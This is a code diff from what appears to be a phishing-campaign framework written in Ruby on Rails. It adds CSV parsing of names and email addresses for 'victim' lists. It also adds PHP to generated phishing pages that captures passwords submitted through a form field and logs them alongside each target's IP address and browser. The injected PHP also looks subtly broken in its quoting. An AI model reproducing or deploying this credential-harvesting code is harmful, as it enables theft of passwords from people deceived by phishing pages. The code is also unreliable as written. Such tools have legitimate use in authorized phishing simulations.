@@ -51,27 +51,60 @@ class Campaign < ActiveRecord::Base
 
   def parse_email_addresses
     if not self.emails.blank?
-      # csv or carriage
-      if self.emails.include? ","
-        victims = self.emails.split(",")
-        victims.each do |v|
-          victim = Victim.new
-          victim.campaign_id = self.id
-          victim.email_address = v.strip
-          victim.save
-        end
-      else
-        victims = self.emails.split("\r\n")
-        victims.each do |v|
-          victim = Victim.new
-          victim.campaign_id = self.id
-          victim.email_address = v
-          victim.save
-        end
+      entry = self.emails.split("\r\n")[0]
+      if entry.scan(/,/).count == 0
+        # email
+        parse_single_csv
+      elsif entry.scan(/,/).count == 1
+        # firstname, email
+        parse_double_csv
+      elsif entry.scan(/,/).count == 2
+        # firstname, lastname, email
+        parse_triple_csv
       end
-
+      
       # clear the Campaigns.emails holder
       self.update_attribute(:emails, " ")
+    end
+  end
+
+  def parse_single_csv
+    victims = self.emails.split("\r\n")
+    victims.each do |v|
+      victim = Victim.new
+      victim.campaign_id = self.id
+      victim.firstname = ""
+      victim.lastname = ""
+      victim.email_address = v
+      victim.save
+    end
+  end
+
+  def parse_double_csv
+    victims = self.emails.split("\r\n")
+    victims.each do |v|
+      firstname = v.split(",")[0].strip
+      email = v.split(",")[1].strip
+      victim = Victim.new
+      victim.campaign_id = self.id
+      victim.firstname = firstname
+      victim.email_address = email
+      victim.save
+    end
+  end
+
+  def parse_triple_csv
+    victims = self.emails.split("\r\n")
+    victims.each do |v|
+      firstname = v.split(",")[0].strip
+      lastname = v.split(",")[1].strip
+      email = v.split(",")[2].strip
+      victim = Victim.new
+      victim.campaign_id = self.id
+      victim.firstname = firstname
+      victim.lastname = lastname
+      victim.email_address = email
+      victim.save
     end
   end
 
@@ -131,6 +164,11 @@ class Campaign < ActiveRecord::Base
         if File.extname(page.file.current_path) == '.php'
           fo.puts "
                   <?php
+                  $password = $_POST['FormFieldName'];
+                  if ($password != "") {
+                    $password = 'password:'' . $password; 
+                  }
+
                   $uid = $_GET['uid'];
                   $ip = $_SERVER['REMOTE_ADDR'];
                   $browser = $_SERVER['HTTP_USER_AGENT'];
